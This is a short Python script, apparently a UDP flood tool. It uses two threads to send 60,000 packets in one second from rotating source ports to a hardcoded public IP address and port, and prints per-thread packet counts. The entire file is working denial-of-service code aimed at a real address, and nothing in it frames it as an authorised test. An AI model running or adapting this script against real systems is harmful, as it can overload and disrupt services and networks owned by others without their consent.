import socket
import time
import threading

class SharedPort:
    def __init__(self, initial_port):
        self.port = initial_port
        self.lock = threading.Lock()

    def get_and_increment(self, thread_id):
        with self.lock:
            current_port = self.port
            self.port += 1
            #print(f"Thread {thread_id} acquired lock and incremented port to {self.port}")
            return current_port

def udp_flood(dst_ip, dst_port, packet_count, send_time, shared_port, thread_id, packet_counter):
    gap = send_time / packet_count
    for i in range(packet_count):
        try:
            port = shared_port.get_and_increment(thread_id)

            src_port = port
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind(('', src_port))  
            sock.sendto(b"X" * 36, (dst_ip, dst_port))
            print(f"Thread {thread_id}: Sent packet {i+1} from port {src_port} to {dst_ip}:{dst_port}")
            sock.close()  
            packet_counter[thread_id] += 1
            time.sleep(gap)
        except Exception as e:
            print(f"Thread {thread_id}: Error sending packet {i+1} - {e}")

if __name__ == "__main__":
    dst_ip = "47.96.121.125"  
    dst_port = 11111  
    packet_count = 60000  
    send_time = 1  

    # 初始化共享端口号
    shared_port = SharedPort(1024)

    thread_count = 2
    threads = []
    packet_counter = {i: 0 for i in range(thread_count)}  # 初始化每个线程的包计数器

    for i in range(thread_count):
        t = threading.Thread(target=udp_flood, args=(dst_ip, dst_port, packet_count // thread_count, send_time, shared_port, i, packet_counter))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    # 打印每个线程发送的包数量
    for thread_id, count in packet_counter.items():
        print(f"Thread {thread_id} sent {count} packets")
